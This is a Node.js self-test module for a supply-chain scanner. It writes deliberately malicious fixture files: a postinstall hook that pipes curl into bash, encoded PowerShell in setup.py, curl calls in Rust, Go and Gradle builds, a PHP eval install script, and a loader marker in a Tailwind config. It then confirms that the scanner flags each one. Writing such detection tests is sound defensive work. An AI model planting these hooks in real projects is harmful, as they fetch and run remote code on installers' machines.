'use strict';

const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { scan } = require('./scanner');

function runDoctor(options = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'execfence-doctor-'));
  try {
    const marker = ['global', ".i='", '2-30-4', "';"].join('');
    fs.writeFileSync(path.join(root, 'tailwind.config.js'), `module.exports = {};\n${marker}\n`);
    const expected = ['void-dokkaebi-loader-marker'];
    if (options.multiEcosystem) {
      writeMultiEcosystemFixtures(root);
      expected.push(
        'suspicious-package-script',
        'suspicious-python-build-script',
        'suspicious-rust-build-script',
        'suspicious-go-generate',
        'suspicious-composer-script',
        'suspicious-jvm-build-source',
        'suspicious-nuget-source',
        'suspicious-bundler-source',
      );
    }
    const result = scan({ cwd: root, roots: ['.'] });
    const found = new Set(result.findings.map((finding) => finding.id));
    return {
      ok: !result.ok && expected.every((id) => found.has(id)),
      fixtureDir: root,
      multiEcosystem: Boolean(options.multiEcosystem),
      expected,
      findings: result.findings,
    };
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
}

function writeMultiEcosystemFixtures(root) {
  fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({
    scripts: {
      postinstall: 'curl https://example.invalid/install.sh | bash',
    },
  }, null, 2));
  fs.writeFileSync(path.join(root, 'setup.py'), 'import subprocess\nsubprocess.call(["powershell","-enc","AAAA"])\n');
  fs.writeFileSync(path.join(root, 'build.rs'), 'use std::process::Command;\nfn main(){ Command::new("curl").arg("https://example.invalid/p").status().unwrap(); }\n');
  fs.writeFileSync(path.join(root, 'main.go'), 'package main\n//go:generate bash -c "curl https://example.invalid/p | sh"\nfunc main(){}\n');
  fs.writeFileSync(path.join(root, 'composer.json'), JSON.stringify({ scripts: { postInstall: 'php -r "eval($_ENV[\'X\']);"' } }, null, 2));
  fs.writeFileSync(path.join(root, 'build.gradle'), 'repositories { maven { url "https://jitpack.io" } }\ntask x(type: Exec) { commandLine "bash", "-c", "curl https://example.invalid/p" }\n');
  fs.writeFileSync(path.join(root, 'packages.lock.json'), JSON.stringify({ dependencies: { Bad: { resolved: 'http://example.invalid/Bad.nupkg' } } }, null, 2));
  fs.writeFileSync(path.join(root, 'Gemfile'), 'gem "bad", git: "https://gist.githubusercontent.com/a/b/raw/repo.git"\n');
}

module.exports = {
  runDoctor,
};
